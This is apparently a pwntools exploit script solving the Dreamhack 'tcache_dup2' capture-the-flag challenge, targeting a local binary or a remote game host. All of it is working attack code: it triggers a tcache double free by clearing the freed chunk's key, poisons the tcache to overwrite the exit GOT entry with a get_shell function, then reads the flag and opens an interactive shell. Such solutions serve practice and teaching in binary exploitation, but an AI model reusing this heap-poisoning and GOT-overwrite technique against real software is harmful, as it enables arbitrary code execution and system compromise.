#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = './tcache_dup2_patched'
HOST = 'host8.dreamhack.games'
PORT = 23274

exe = ELF(exe_path, checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
b*0x00000000004012fb
b*0x0000000000401413
b*0x0000000000401514
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)
def rcu(data):
    return p.recvuntil(data)
def rl():
    return p.recvline()

# ============================EXPLOIT============================
def create(size, data):
    sla(b'> ', b'1')
    sla(b'Size: ', str(size).encode())
    sa(b'Data: ', data)
def modify(idx, size, data):
    sla(b'> ', b'2')
    sla(b'idx: ', str(idx).encode())
    sla(b'Size: ', str(size).encode())
    sa(b'Data: ', data)
def delete(idx):
    sla(b'> ', b'3')
    sla(b'idx: ', str(idx).encode())

get_shell = exe.sym.get_shell
create(0x88, b'A'*0x10)
create(0x88, b'B'*0x10)
delete(0)
modify(0, 0x10, b'\x00'*0xf)
delete(0)
modify(0, 0x10, p64(exe.got.exit))
create(0x88, b'C'*0x10)
create(0x88, p64(get_shell))
for i in range(3):
    create(0x88, b'D'*0x10)
sla(b'> ', b'1')
sl(b'cat flag*')
p.interactive()
